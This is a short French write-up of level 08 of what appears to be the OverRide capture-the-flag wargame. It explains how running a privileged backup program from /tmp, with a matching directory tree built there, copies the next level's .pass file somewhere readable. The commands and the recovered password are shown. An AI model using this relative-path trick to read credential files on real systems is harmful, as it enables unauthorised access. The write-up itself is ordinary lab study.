# Level 08

Le programme ouvre deux fichiers à partir de notre premier argument.
à savoir `$1` et `./backups/$1`
Ensuite il copie le contenu du premier fichier dans le second.

Pour récupérer notre pass il suffit de duper l'appel à open en construisant la même structure de fichier que `/home/users`... dans `/tmp`.

Nous faisons un `cd /tmp` pour que le PWD soit égale à `/tmp`. Comme ça `./backups` donnera `/tmp/backups`.

```bash
cd /tmp 
mkdir -p /tmp/backups/home/users/level09
```

```bash
~/level08 /home/users/level09/.pass
```

```bash
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass 
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```